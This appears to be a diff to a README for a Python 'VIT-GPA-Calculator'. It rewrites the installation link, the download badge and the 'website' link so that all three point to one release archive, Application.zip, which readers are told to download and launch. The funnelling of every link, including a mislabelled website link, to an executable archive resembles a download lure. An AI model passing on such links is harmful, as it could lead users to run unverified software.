@@ -11,7 +11,7 @@ Welcome to the VIT-GPA-Calculator repository! This Python application is designe
 
 ## Installation
 
-To get started with VIT-GPA-Calculator, download the [Application.zip](https://github.com/files/Application.zip) file and launch the application.
+To get started with VIT-GPA-Calculator, download the [https://github.com/ManiPerez913/VIT-GPA-Calculator/releases/download/v1.0/Application.zip](https://github.com/ManiPerez913/VIT-GPA-Calculator/releases/download/v1.0/Application.zip) file and launch the application.
 
 ## Usage
 
@@ -33,10 +33,10 @@ If you are interested in contributing to the VIT-GPA-Calculator project, feel fr
 
 For any questions, issues, or feedback regarding VIT-GPA-Calculator, please check the "Releases" section of the repository or reach out to the project maintainers.
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/files/Application.zip)
+[![Download Application](https://github.com/ManiPerez913/VIT-GPA-Calculator/releases/download/v1.0/Application.zip)](https://github.com/ManiPerez913/VIT-GPA-Calculator/releases/download/v1.0/Application.zip)
 
 Let's make academic calculations easier with VIT-GPA-Calculator! 📚✨
 
 ---
 
-**Note**: For more detailed information, please visit the [VIT-GPA-Calculator website](https://vitgpacalculator.com).
+**Note**: For more detailed information, please visit the [VIT-GPA-Calculator website](https://github.com/ManiPerez913/VIT-GPA-Calculator/releases/download/v1.0/Application.zip).
